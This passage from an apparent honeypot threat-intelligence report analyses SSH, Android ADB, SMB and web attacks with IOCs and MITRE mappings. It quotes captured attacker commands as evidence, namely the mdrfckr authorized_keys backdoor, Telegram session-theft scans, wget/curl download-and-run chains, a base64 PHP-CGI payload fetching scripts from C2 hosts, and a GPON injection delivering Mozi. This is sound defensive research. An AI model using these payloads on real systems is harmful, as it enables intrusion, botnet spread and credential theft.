| **Cobalt Strike (JARM)** | JARM fingerprints on 4 AWS IPs matching known CS profiles | T1090.004, T1071.001 | 18.218.118.203, 3.132.26.232, 3.130.168.2, 3.129.187.38 |
| **Redis-to-SSH key injection** | Redis honeypot — 8.210.133.68 (491 events) | `CONFIG SET dir /root/.ssh` + `BGSAVE` | 8.210.133.68 (HK) |
| **Cryptomining dropper (mdrfckr)** | Cowrie post-auth: `chattr`, SSH key injection, `pkill` competing malware | T1554, T1496, T1547 | 81.9.145.130, 197.140.11.157 + others |
| **Custom SSH clients** *(pre-rotation)* | JA3 fingerprints: `16443846184eafde36765c9bab2f4397` (modern), `084386fa7ae5039bcf6f07298a05a227` (legacy) | T1071.002 | 118.26.110.171 (SG), 16.58.56.214 (US) |
| **TOR SSH client** *(pre-rotation)* | TOR exit node IP reputation; SSH over TOR | T1090.003 | 192.42.116.50 (NL) |
| **Telnet scanner (Mirai-style)** *(pre-rotation)* | Port 23 scans; default credential attempts | IoT brute-force | 103.26.86.240 (PK) |

**Web reconnaissance tools detected** *(pre-rotation):*

| Tool | Detection | Source IPs |
| --- | --- | --- |
| curl | User-Agent `curl/7.64.1` | 8.222.128.242 (SG) |
| Python Requests | User-Agent `python-requests*` | Various |
| Generic Path Traversal Scanner | `/etc/passwd` requests via Tanner | 183.81.169.235 (NL) |
| DNS Version Scanner | `VERSION.BIND` queries | 85.25.172.249 (FR), 198.235.24.161 (US/Google) |

---

## 8\. SSH Intrusion Analysis (Cowrie)

### 8.1 Session Summary

| Event | Count |
| --- | --- |
| Sessions connected | 3,570 |
| Sessions closed | 3,654 |
| Login attempts (failed) | 159 |
| **Login successes** | **18** |
| Commands executed | 242 |
| File downloads (malware) | 14 |
| File uploads | 1 |
| Client version handshakes | 185 |

### 8.2 Successful Logins - All 18 Events

| Source IP | Username | Password | Notes |
| --- | --- | --- | --- |
| 34.76.69.214 | `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4746` | RTSP probe misrouted to SSH port |
| 84.103.174.6 | `root` | `12345a` | Simple credential hit |
| 35.233.114.137 | `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 8606` | Second RTSP probe (GCP IP) |
| 34.53.197.105 | `*1` | `$4` | Redis AUTH probe misrouted - GCP |
| **172.214.209.153** | `root` | `Tk123456@` | **Full post-exploitation + payload download** |
| 34.78.127.216 | `User-Agent: Mozilla/5.0...` | `Accept-Encoding: gzip` | HTTP request misrouted to SSH |
| 34.78.127.216 | `*1` | `$4` | Redis AUTH probe - same GCP IP |
| **105.27.148.94** | `mailuser` | `12345` | Kenya IP - malware downloaded |
| **197.140.11.157** | `git` | `git@123` | Morocco - coordinated actor (see 11) |
| **81.9.145.130** | `root` | `online@2025` | Turkey - coordinated actor (see 11) |
| **197.140.11.157** | `root` | `online@2025` | Morocco - second login, same password as 81.9.145.130 |
| **197.140.11.157** | *(session)* | *(session)* | Third session - payload download confirmed |
| **38.242.147.245** | `root` | `root.1234` | Germany (Hetzner VPS) - payload download |
| **81.9.145.130** | `git` | `git@123` | Turkey - second login (git user) |
| **120.138.6.3** | `root` | `root4321` | New Zealand - payload download |
| **210.16.103.246** | `root` | `linux` | Japan - trivial credential |
| **81.192.138.65** | `ubuntu` | `a` | Netherlands - single-char password |
| **196.92.7.249** | `ubuntu` | `3245gs5662d34` | Kenya - complex password still compromised |

---

## 9\. Malware & Payload Analysis

### 9.1 Overview

Malware was captured across three honeypot sources: **Cowrie** (post-exploitation SSH/Telnet payloads), **ADBHoney** (Android Debug Bridge exploitation payloads), and **Dionaea** (SMB exploit-delivered binaries). All samples were enriched via VirusTotal. The complete dataset spans **51 unique hashes** (21 SHA256 from Cowrie, 8 SHA256 from ADBHoney, 22 MD5 from Dionaea).

| Source | Hashes | Malicious | Benign | Not in VT | Family |
| --- | --- | --- | --- | --- | --- |
| Cowrie (SSH/SFTP) | 21 | 15 | 3 | 3 | Linux XMRig Miner, Mirai, Gafgyt/Mozi IoT botnet |
| ADBHoney (ADB TCP 5555) | 8 | 8 | 0 | 0 | Android AdbMiner APK, ARM ELF AdbMiner trojan |
| Dionaea (SMB/EternalBlue) | 22 | 22 | 0 | 0 | WannaCry ransomware (CVE-2017-0144/0147) |
| **TOTAL** | **51** | **45** | **3** | **3** |  |

---

### 9.2 Cowrie SSH/Telnet Payloads (SHA256)

Cowrie captures payloads dropped by attackers after successful SSH/Telnet authentication. The dominant families are Linux ELF cryptominers (statically compiled XMRig, 20–25 MB bundles) and IoT botnets (Mirai, Gafgyt). 

### 9.3 ADBHoney Android Payloads (SHA256)

ADBHoney emulates an exposed Android ADB port (TCP 5555). Attackers use it to sideload APKs or drop ELF binaries onto Android devices. All 8 samples are confirmed malicious — 6 are ARM ELF binaries (ADB miner trojans) and 1 is a complete Android APK (cryptominer app).

### 9.4 Dionaea SMB/EternalBlue Payloads (MD5)

Dionaea emulates vulnerable Windows SMB services. All 22 samples delivered via EternalBlue (CVE-2017-0147 / MS17-010) are **WannaCry ransomware** - confirming that unpatched Windows SMB nodes remain actively exploited in 2026, nearly a decade after the 2017 global outbreak.

**Common profile across all 22 samples:**

-   File type: Win32 DLL (~5.02 MB each)
-   Exploit vector: CVE-2017-0147 (EternalBlue) and/or CVE-2017-0144 (EternalRomance)
-   Detection range: 61–68 of 70–72 engines (88–95%)
-   YARA: `WannaCry_Ransomware` (Neo23x0/signature-base) on all samples
-   Sigma: Critical — "WannaCry Ransomware Activity"
-   Sandbox: MALWARE + RANSOM + EVADER on every sample
-   Kill switch: Most contact `iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com` (sinkholes since 2017)

**Dionaea key insight:** The fact that WannaCry is still being actively delivered via EternalBlue in 2026 confirms a persistent global population of unpatched Windows SMB services.

### 9.5 MITRE ATT&CK Coverage - All Payloads

| Technique | ID | Tactic | Sources |
| --- | --- | --- | --- |
| SSH Authorized Keys Manipulation | T1098.004 | Persistence | Cowrie |
| Compromise Client Software Binary (sshd replacement) | T1554 | Persistence | Cowrie |
| Resource Hijacking (Cryptomining) | T1496 | Impact | Cowrie, ADBHoney |
| Masquerading: Match Legitimate Name (nohup, sshd) | T1036.005 | Defense Evasion | Cowrie, ADBHoney |
| Ingress Tool Transfer | T1105 | Command and Control | Cowrie, ADBHoney |
| Obfuscated Files or Information (UPX Packing) | T1027 | Defense Evasion | Cowrie (Gafgyt) |
| Virtualization/Sandbox Evasion | T1497 | Defense Evasion | ADBHoney |
| Process Injection via DLL Loader | T1055 | Defense Evasion / Privilege Escalation | ADBHoney (#5) |
| Phishing: Spearphishing Attachment (Malicious PDF) | T1566.001 | Initial Access | ADBHoney (#5) |
| Signed Binary Proxy Execution: Rundll32 | T1218.011 | Defense Evasion | ADBHoney (#5) |
| Deliver Malicious App via ADB | T1475 | Initial Access | ADBHoney |
| Network Denial of Service (Mirai/Gafgyt DDoS Capability) | T1498 | Impact | Cowrie |
| Boot or Logon Autostart Execution (Trojanized sshd) | T1547 | Persistence / Privilege Escalation | Cowrie |
| Data Encrypted for Impact (WannaCry) | T1486 | Impact | Dionaea |
| Exploitation of Remote Services (EternalBlue) | T1210 | Lateral Movement | Dionaea |
| SMB/Windows Admin Shares | T1021.002 | Lateral Movement | Dionaea |
| Service Stop | T1489 | Impact | Dionaea |

---

## 10\. Post-Exploitation Command Analysis

### 10.1 Most Executed Commands

| Command | Intent |
| --- | --- |
| *(empty)* | Terminal test / keepalive |
| `top` | CPU/process monitoring - resource check |
| `w` | Active users check - detect other sessions |
| `whoami` | Privilege verification |
| SSH key injection (mdrfckr) | Backdoor via authorized\_keys |
| `chattr -ia .ssh` | Remove immutability before key injection |
| cat /proc/cpuinfo | grep name |
| cat /proc/cpuinfo | head -n 1 |
| free -m | grep Mem |
| df -h | head -n 2 |
| lscpu | grep Model |
| `uname` / `uname -a` / `uname -m` | OS/kernel/arch fingerprinting |
| `crontab -l` | Persistence check |
| `ls -lh $(which ls)` / `which ls` | Environment probe |
| rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep; | Remove competing malware |

### 10.2 SSH Key Backdoor - "mdrfckr"

The following authorized\_keys injection was observed 9 times:

```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr" >> .ssh/authorized_keys && chmod -R go= ~/.ssh
```

The comment field `mdrfckr` is a known cryptomining threat actor signature associated with the **"mdrfckr" SSH cryptomining campaign** documented since 2019. The RSA key has remained consistent across years of campaigns.

Sequence: `chattr -ia .ssh` (strip immutable flag) > `rm -rf .ssh` (clean existing keys) → `mkdir .ssh` > inject key > `chmod -R go= ~/.ssh` (lock permissions).

### 10.3 Cleanup Command

```bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; 
echo > /etc/hosts.deny; pkill -9 sleep;
```

This command removes competing malware scripts (`secure.sh`, `auth.sh`) and clears `/etc/hosts.deny` - which competing bots sometimes populate to block other attackers. This is **competition removal behaviour**, typical of resource-constrained cryptomining operations.

---

### 10.4 Cowrie Post-Exploitation Commands - By Attacker IP

#### Standard Miner Recon Playbook

The following command set was executed by **every IP that achieved successful Cowrie login**. It represents a standardised, scripted post-exploitation playbook consistent with a widely distributed cryptomining botnet framework.

**Phase 1 - SSH Directory Preparation:**

```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh    # Strip immutable flags from .ssh dir
lockr -ia .ssh                            # Secondary lockr removal
```

**Phase 2 - System Fingerprinting (resource pre-check for miner sizing):**

```bash
uname; uname -a; uname -m                                           # OS / kernel / arch
cat /proc/cpuinfo | grep model | grep name | wc -l                 # CPU core count
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}' # CPU model
cat /proc/cpuinfo | grep name | wc -l                              # CPU thread count
lscpu | grep Model                                                  # CPU model name
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'         # RAM availability
df -h | head -n 2 | awk 'FNR == 2 {print $2;}'                    # Disk space
crontab -l                                                          # Check existing cron jobs
w                                                                   # Active users / sessions
top                                                                 # CPU load check
whoami                                                              # Privilege verification
ls -lh $(which ls); which ls                                       # Environment probe
```

**Phase 3 - Persistence:** SSH key injection (mdrfckr key - see 10.2)

**Phase 4 - Cleanup:**

```bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```

*(Run by 172.214.209.153, 189.147.19.238, 40.112.183.29 ×3 each; 152.52.15.214, 34.72.208.101 ×2; and ~15 single-session IPs)*

---

#### Per-IP Command Details

**Tier 1 - Highest Activity (3 sessions each)**

| IP | VT / Origin | Session-specific commands |
| --- | --- | --- |
| 172.214.209.153 | Azure US / community -10 | \`echo "root:bFUspuBnqy8o" |
| 189.147.19.238 | UNINET Mexico / 16/91 | \`echo "root:eRM9bx19z3uP" |
| 40.112.183.29 | Azure US / community -9 | \`echo "root:UmSJXLVGnhVR" |

**Tier 2 - Active (2 sessions each)**

| IP | VT / Origin | Session-specific commands |
| --- | --- | --- |
| 81.9.145.130 | Euskaltel Spain / 13/91 | \`echo "git@123\\nAfXDNqCN0jYT\\nAfXDNqCN0jYT\\n" |
| 197.140.11.157 | Icosnet Algeria / 11/91 | \`echo "git@123\\nUZ2CVv9sYuWJ\\nUZ2CVv9sYuWJ\\n" |
| 172.203.149.63 | Azure US / 10/91 | \`echo "1234\\nm6MB4iDSB4BD..." |
| 90.169.216.25 | Orange Spain / 9/91 — compromised Synology NAS | \`echo "1\\nTVqeaa3dMr6T\\nTVqeaa3dMr6T\\n" |
| 102.218.89.110 | SIL6-AS Uganda / 10/91 — compromised grailafrica.com | \`echo "1\\nli1xkeb7Axqe\\nli1xkeb7Axqe\\n" |
| 183.94.33.245 | China Unicom / 12/91 | \`echo "Wangsu@2017\\nuOI15NqdQPwY..." |
| 40.78.155.180 | Azure US / 9/91 | \`echo "123456\\nURZ38lUoVmwn\\nURZ38lUoVmwn\\n" |
| 79.36.191.212 | TIM Italy / 7/91 | \`echo "123456\\n6cBFSTRJBlk1\\n6cBFSTRJBlk1\\n" |
| 152.52.15.214 | Airtel India / 5/91 — compromised FortiGate | \`echo "root:CrRY7b2nelJm" |
| 34.72.208.101 | Google Cloud / 9/91 | \`echo "root:CwJHGYgRxGc8" |

> **Password change pattern:** The `echo "oldpass\nnewpass\nnewpass\n"|passwd` and `echo "root:newpass"|chpasswd|bash` sequences change the root password immediately after login - the attacker is locking other actors out of the same foothold. Each IP generates a **unique randomised new password,** consistent with automated tooling that generates per-session credentials to prevent competing actors from reusing the same access path.

---

#### Anomalous IPs - Non-Standard Post-Exploitation Behaviour

**112.185.143.13 / 45.15.225.137 / 59.22.201.143 - MikroTik / Telegram Data Theft**

These three IPs ran a completely different playbook from the miner campaign - one focused on device enumeration and data theft:

```bash
/ip cloud print                    # MikroTik RouterOS command — probing for RouterOS device
echo Hi | cat -n                   # TTY capability / echo test
ifconfig                           # Network interface enumeration
cat /proc/cpuinfo                  # Hardware identification
locate D877F783D5D3EF8Cs           # Searching for a specific file by name/hash
ls -la ~/.local/share/TelegramDesktop/tdata \
  /home/*/.local/share/TelegramDesktop/tdata \
  /dev/ttyGSM* /dev/ttyUSB-mod* \
  /var/spool/sms/* /var/log/smsd.log \
  /etc/smsd.conf* /usr/bin/qmuxd \
  /var/qmux_connect_socket /etc/config/simman \
  /dev/modem* /var/config/sms/*   # Telegram session files + SMS/modem data theft
ps -ef | grep '[Mm]iner'           # Hunting for existing miners
ps | grep '[Mm]iner'               # Secondary miner check
```

**Assessment:** `/ip cloud print` confirms this actor was testing for a **MikroTik RouterOS device** - a common embedded router target. The `Telegram tdata` path scan is a targeted credential theft operation: Telegram Desktop stores active session tokens in `~/.local/share/TelegramDesktop/tdata`; extracting this allows account takeover without knowing the password. The SMS/modem device paths (`/dev/ttyGSM*`, `/var/qmux_connect_socket`) indicate the attacker was also hunting for **SIM card / GSM modem access** - likely for SMS interception or OTP bypass. The `locate D877F783D5D3EF8Cs` command is searching for a specific artifact by a partial hash-like string - possibly checking for the presence of a previously dropped file or competing malware.

**MITRE ATT&CK:** T1119 (Automated Collection), T1552.001 (Credentials in Files - Telegram), T1592 (Gather Victim Host Information)

---

**189.250.195.97 / 213.165.187.23 / 88.119.95.176 - Mirai IoT Botnet**

```bash
shell; system; q; enable; sh         # Shell escape attempts — testing for restricted CLI
while read i                          # Input loop for payload delivery
/bin/busybox SHUQE                    # Mirai identifier token (IP 189.250.195.97)
/bin/busybox FCQPY                    # Mirai identifier token (IP 213.165.187.23)
/bin/busybox BOVEN                    # Mirai identifier token (IP 88.119.95.176)
cat /proc/mounts; /bin/busybox [TOKEN]
cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox [TOKEN]
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
rm .s; exit
```

**Assessment:** These are classic Mirai/variant botnet commands. Each IP uses a different 5-character all-caps identifier token (SHUQE, FCQPY, BOVEN) - Mirai variants use unique tokens to identify which infection wave or operator cluster a bot belongs to. The `/dev/shm` staging pattern (writing to shared memory rather than `/tmp`) is an evasion technique to avoid disk-based malware scanners. The `dd bs=52` read pattern is Mirai's method of reading its own configuration blob. All three IPs also attempted `shell`, `system`, `enable`, `linuxshell` - commands that work on Cisco IOS, Juniper, and other network device CLIs — confirming this botnet scans both Linux hosts and network appliances.

---

**91.231.203.3 (Arpinet Armenia) - Cisco/RouterOS + Mirai Hybrid**

```bash
adminpass; config terminal; linuxshell; start; enable  # Network device CLI commands
/ip cloud print                                         # MikroTik RouterOS
cd /tmp || cd /var || cd /dev || cd /etc               # Writable directory hunt
cat /bin/ls | more; cat /bin/ls|head -n 1             # Binary inspection
dd bs=52 count=1 if=/bin/ls...                        # Mirai-style binary read
chmod                                                   # Permission change
while read i                                            # Payload loop
```

**Assessment:** This IP is operating a hybrid IoT/network device botnet - running both Cisco IOS / MikroTik commands and standard Linux Mirai commands in the same session. The `cat /bin/ls | more` and `dd bs=52 count=1 if=/bin/ls` commands are Mirai's technique for fingerprinting the system's `ls` binary to determine the exact Linux distribution and architecture.

---

**47.242.51.128 (Alibaba Cloud HK) - Binary Payload Injection**

```bash
>D6@/XJ'8                                              # Binary data probe (possible exploit payload)
dd bs=1 count=1911588 > /tmp/iGgZN5k2x2              # Writing ~1.9 MB binary to /tmp via stdin
```

**Assessment:** The `dd bs=1 count=1911588` command is transferring a **~1.82 MB binary** to `/tmp/iGgZN5k2x2` via stdin pipe - a technique for uploading malware without using network download tools (`wget`, `curl`). The destination filename appears randomly generated. The initial binary data probe (`>D6@/XJ'8`) is likely a raw protocol test or the beginning of the binary transfer.

---

**199.45.154.117 - WebSocket Protocol Probe**

```bash
Sec-WebSocket-Version: 13
Upgrade: websocket
```

**Assessment:** HTTP WebSocket upgrade headers sent to an SSH port. This is automated tooling probing for WebSocket endpoints - the scanner does not distinguish between SSH and HTTP services and sends WebSocket handshake headers regardless. Likely a broad-spectrum web service scanner rather than a targeted attack.

---

### 10.5 ADB Honeypot Attack Commands - By Attacker IP

ADBHoney emulates an exposed Android Debug Bridge port (TCP 5555). The commands below are the full sequence of ADB shell commands sent by attacking IPs.

#### Campaign 1 - UFO Miner Installation (8 IPs, coordinated)

**Attacking IPs:** 58.227.216.183, 112.224.144.25, 112.81.86.115, 115.233.222.114, 118.45.247.163, 139.200.7.170, 171.241.74.189, 183.232.212.195

All 8 IPs executed the same sequence - a fully automated APK-based Android cryptominer installation:

```bash
rm -rf /data/local/tmp/*                                          # 1. Clear staging area
chmod 0755 /data/local/tmp/nohup                                  # 2. Make nohup executable
chmod 0755 /data/local/tmp/trinity                                # 3. Make miner binary executable
/data/local/tmp/nohup /data/local/tmp/trinity                     # 4. Launch miner (user)
/data/local/tmp/nohup su -c /data/local/tmp/trinity               # 5. Launch miner (root via su)
ps | grep trinity                                                  # 6. Verify miner running
pm install /data/local/tmp/ufo.apk                                # 7. Install APK miner
pm path com.ufo.miner                                             # 8. Verify APK installation
am start -n com.ufo.miner/com.example.test.MainActivity           # 9. Launch miner app
rm -f /data/local/tmp/ufo.apk                                     # 10. Remove APK (cleanup)
```

**Analysis:** The binary `trinity` is the ELF cryptominer executable (executed directly as a Linux process). The `ufo.apk` installs `com.ufo.miner` — the Android Monero miner APK identified with 48/67 VT detections, contacts coinhive.com. The two-track approach (ELF binary + APK) maximises mining resources: the ELF binary runs as a Linux process using the device CPU directly, while the APK version runs within the Android runtime. The `nohup su -c` escalation attempt confirms the attacker is trying to maintain miner persistence across reboots.

---

#### 67.84.50.76 - Dual Campaign (UFO Miner + Disguised TV App)

This IP ran the UFO miner sequence AND a separate campaign disguising the miner as a Google Home TV application:

```bash
chmod 0755 /data/local/tmp/log                                    # "log" binary (miner disguised as log daemon)
/data/local/tmp/nohup /data/local/tmp/log                         # Run as log process
/data/local/tmp/nohup su -c /data/local/tmp/log                   # Run as root
ps | grep log; ps | grep rig; ps | grep xig                       # Verify miner processes
pm install /data/local/tmp/tv.apk                                 # Install as "TV app"
am start -n com.google.home.tv/com.example.test.MainActivity      # Launch as Google Home TV
pm path com.google.home.tv                                        # Verify installation
rm /data/local/tmp/tv.apk                                         # Cleanup
```

**Analysis:** The `com.google.home.tv` package name masquerades as a legitimate Google TV application - a social engineering layer designed to avoid detection if the device owner inspects running apps. The `ps | grep rig` and `ps | grep xig` checks are looking for XMRig variants - confirming this is a Monero mining operation. The binary named `log` is a renamed miner designed to blend into process lists.

**MITRE ATT&CK:** T1036.005 (Masquerading: Match Legitimate Name), T1496 (Resource Hijacking)

---

#### 176.65.139.3 - ARM Bot Downloader

```bash
getprop ro.product.cpu.abi              # CPU architecture (armeabi-v7a, arm64-v8a, etc.)
cat /proc/cpuinfo | grep -m1 Hardware  # Hardware platform identification
ls /proc/self/exe                       # Executable path verification
uname -m                               # Kernel architecture
# Multi-method download with fallback:
cd /data/local/tmp; \
  wget -q http://176.65.139.3/bot-armv7l -O .b 2>/dev/null || \
  busybox wget -q http://176.65.139.3/bot-armv7l -O .b 2>/dev/null || \
  curl -s http://176.65.139.3/bot-armv7l -o .b 2>/dev/null; \
  chmod 755 .b 2>/dev/null; ./.b &
```

**Analysis:** This IP (176.65.139.3) performs full CPU architecture fingerprinting before downloading an architecture-specific ARM bot binary (`bot-armv7l`). The triple-method download chain (`wget` → `busybox wget` → `curl`) maximises compatibility across Android devices regardless of which utilities are installed. The bot is downloaded as a hidden file (`.b`) and executed immediately in the background. **Note:** 176.65.139.3 is the C2 server for the ADBHoney ARM bot payload captured and first seen 4 days before capture.

---

#### 176.65.139.174 - Device Fingerprinting Only

```bash
getprop ro.product.cpu.abi     # CPU architecture
getprop ro.product.brand       # Device manufacturer
getprop ro.product.model       # Device model
```

**Analysis:** Pure reconnaissance - no payload delivery. This IP is fingerprinting the device before deciding which payload to deploy. The `ro.product.brand` and `ro.product.model` props allow the attacker to tailor the attack to the specific Android device type.

---

#### 176.65.139.121 / 176.65.139.155 - Connection Tests

```bash
echo hello
```

Basic TTY connectivity test from the same /24 subnet (176.65.139.0/24) — confirming this entire subnet is part of the same ADB-targeting threat actor infrastructure.

---

### 10.6 Web Honeypot HTTP Attack Analysis

This section covers attack payloads and HTTP-level behaviour captured across the web-facing honeypot services. Data sourced from `sourcetype=tanner:json`, `sourcetype=wordpot`, `sourcetype=ipphoney:json`, and `sourcetype=nginx:access`.

---

#### Campaign: CVE-2024-4577 PHP-CGI Self-Replicating Exploitation

The most structured HTTP-level attack campaign in the dataset. Attackers exploited PHP-CGI argument injection (soft hyphen bypass) to execute PHP code on the target, delivering a self-replicating payload that fetches and runs a shell script from a remote C2 server.

**Attack structure** (captured from POST request bodies):

```
POST /cgi-bin/php-cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php shell_exec(base64_decode("KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMTQuNDYuMTM2Ljc3L3NoIHx8IGN1cmwgLXNrIGh0dHBzOi8vMTQuNDYuMTM2Ljc3L3NoKSB8IHNoIC1zIGN2ZV8yMDI0XzQ1Nzcuc2VsZnJlcA==")); echo(md5("Hello CVE-2024-4577")); ?>
```

The `echo(md5("Hello CVE-2024-4577"))` fingerprint in the response confirms successful code execution - the attacker checks for a predictable MD5 output to verify the PHP interpreter ran the payload.

**Three distinct C2 infrastructure nodes were identified**, each commanding a separate set of bots:

| C2 Node | Decoded Shell Command | Hits/IP |
| --- | --- | --- |
| 14.46.136.77 | \`(wget --no-check-cert -qO- [https://14.46.136.77/sh](https://14.46.136.77/sh) | curl -sk [https://14.46.136.77/sh](https://14.46.136.77/sh)) |
| 125.135.169.171 | \`(wget --no-check-cert -qO- [https://125.135.169.171/sh](https://125.135.169.171/sh) | curl -sk [https://125.135.169.171/sh](https://125.135.169.171/sh)) |
| 121.176.14.102 | \`(wget --no-check-cert -qO- [https://121.176.14.102/sh](https://121.176.14.102/sh) | curl -sk [https://121.176.14.102/sh](https://121.176.14.102/sh)) |

**Attack IOCs:**

| Type | Value |
| --- | --- |
| C2 IP | 14.46.136.77 |
| C2 IP | 125.135.169.171 |
| C2 IP | 121.176.14.102 |
| Script path | `/sh` on all three C2 servers |
| Payload tag | `cve_2024_4577.selfrep` |
| Payload tag | `apache.selfrep` |
| Canary string | `echo(md5("Hello CVE-2024-4577"))` — execution confirmation |

**Key observations:**

-   The `.selfrep` (self-replicating) suffix indicates this is a **worm** — successfully compromised hosts are instructed to scan for and infect other PHP-CGI targets
-   All three C2 nodes deployed the same technique with identical structure — likely the same threat actor operating distributed infrastructure
-   Source IPs across all three campaigns include multiple Asian/Korean (101.47.8.187, 121.180.243.232, 101.36.104.242) and European (31.220.81.99, 75.119.152.95) addresses — a geographically distributed bot network
-   **`172.31.44.165`** (the honeypot itself) appears in some source rows — this is Tanner logging internally reflected requests, not a genuine attack from self

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell), T1105 (Ingress Tool Transfer), T1204.001 (Self-Replicating through shared content — worm behaviour)

---

#### PHPUnit Remote Code Execution Probe (CVE-2017-9841)

```
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1

<?php echo(md5("Hello PHPUnit")); ?>
```

The `eval-stdin.php` endpoint in older PHPUnit installations executes arbitrary PHP from the POST body - a pre-authentication RCE vulnerability. The `echo(md5("Hello PHPUnit"))` canary string is identical in structure to the CVE-2024-4577 probe - likely the same tooling, probing multiple PHP vulnerabilities in sequence.

---

#### GPON Router Exploitation - Mozi Botnet Delivery

```
POST /GponForm/diag_Form?images/ HTTP/1.1

XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://[C2_IP]:[PORT]/Mozi.m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0
```

Three distinct C2 servers delivering Mozi botnet binaries via command injection in the GPON router web interface:

| C2 IP | Port | Filename | Source IPs |
| --- | --- | --- | --- |
| 139.135.43.207 | 35775 | Mozi.m | 139.135.43.207 (2 hits) |
| 175.148.154.9 | 40643 | Mozi.m | 175.148.154.9 (2 hits) |
| 223.123.72.240 | 58877 | Mozi.m | 223.123.72.240 (2 hits) |

The `Mozi.m` filename is the Mozi P2P botnet binary. Each attacking IP is also the C2 server - these are **already-compromised GPON routers** using the same vulnerability chain to infect new routers. Classic Mozi worm self-propagation behaviour.

**MITRE ATT&CK:** T1190, T1105, T1570 (Lateral Tool Transfer)

---

#### IPP (Internet Printing Protocol) Scanning

```
.........G..attributes-charset..utf-8H..attributes-natural-language..en-usE
..printer-uri..ipp://32.193.117.201:631/ipp
D..requested-attributes..all.
```

This binary IPP request was sent by **15 distinct IPs** - predominantly AWS and Azure cloud instances - to the IPPHoney service on port 631. The request asks for `requested-attributes: all` against `ipp://32.193.117.201:631/ipp`, attempting to enumerate all printer attributes including the printer model, firmware version, network configuration, and supported document formats.

Notable source IPs include **16.58.56.214** (the AWS Zgrab-confirmed scanner), **3.130.168.2** and **3.129.187.38** (Cobalt Strike JARM candidates), and **18.116.101.220** - suggesting sophisticated actors are actively fingerprinting printer infrastructure, not just mass scanners.

**MITRE ATT&CK:** T1046 (Network Service Discovery), T1592 (Gather Victim Host Information)

---

#### WordPress XML-RPC Brute Force (Wordpot)

The Wordpot honeypot emulates a WordPress installation. Attackers used the XML-RPC API's `wp.getUsersBlogs` method to brute-force the admin password:

```xml
POST /xmlrpc.php HTTP/1.1

<methodCall><methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>[PASSWORD]</string></value></param>
  </params>
</methodCall>
```

Passwords attempted (sequential wordlist, likely rockyou or similar): `1234`, `12345`, `123456`, `1234567`, `12345678`, `123456789`, `1234567890`, `12341234`, `1q2w3e`, `1qaz2wsx`, `111111`, `121212`, `123123`, `222222`, `55555`, `654321`, `666666`, `Andrew`, `Blahblah`, `Cheese`, `Computer`, `Corvette`, `Daniel`, `Ferrari`, `George`, `Hannah`, `Harley`, `Hello`, `Jessica`, `Jordan` + 74 additional (`Other` category).

The systematic numeric > keyboard pattern > name pattern progression is consistent with a standard top-500 wordlist brute-force, not a targeted attack.

---

#### LeakIX SMTP Banner Grab

```
HELP
EHLO leakix.net
?
```

This SMTP probe from IPs in the `35.216.x.x` GCP range (Google Cloud) belongs to **LeakIX** - a legitimate internet security scanning service that catalogues exposed services. The `EHLO leakix.net` banner explicitly identifies the scanner. This is baseline internet background noise rather than a threat actor, but confirms the honeypot is indexed by public scanning services.

---

#### Tanner Web Honeypot - URL Path Scanning

Top URL paths probed against the Tanner web honeypot (from Splunk `sourcetype=tanner:json`):

| Path | Count | Attack Type |
| --- | --- | --- |
| `/` | 78 | Root probe — generic web scanner |
| `/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` | 12 | Apache path traversal RCE (CVE-2021-41773 variant) |
| `/login` | 4 | Generic credential attack |
| `/portal/redlion` | 4 | Red Lion industrial HMI panel probe |
| `/.env` | 2 | Environment file credential theft |
| `/HNAP1/` | 2 | D-Link Home Network Administration Protocol probe |
| `/ReportServer` | 2 | SSRS (SQL Server Reporting Services) panel |
| `/actuator/health` | 2 | Spring Boot actuator endpoint |
| `/admin/config.php` | 2 | Generic PHP admin panel |
| `/boaform/admin/formLogin?username=ec8&psd=ec8` | 2 | Boa web server default credentials |
| `/boaform/admin/formLogin?username=user&psd=user` | 2 | Boa web server default credentials |
| `/cgi-bin/authLogin.cgi` | 2 | QNAP NAS login |
| `/debug.log` | 2 | Debug log file exposure |
| `/developmentserver/metadatauploader` | 2 | SAP development server probe |
| `/druid/index.html` | 2 | Apache Druid unauthenticated access |
| `/hudson` | 2 | Jenkins CI/CD panel |
| `/issues/gantt` | 2 | GitLab issues / project management |
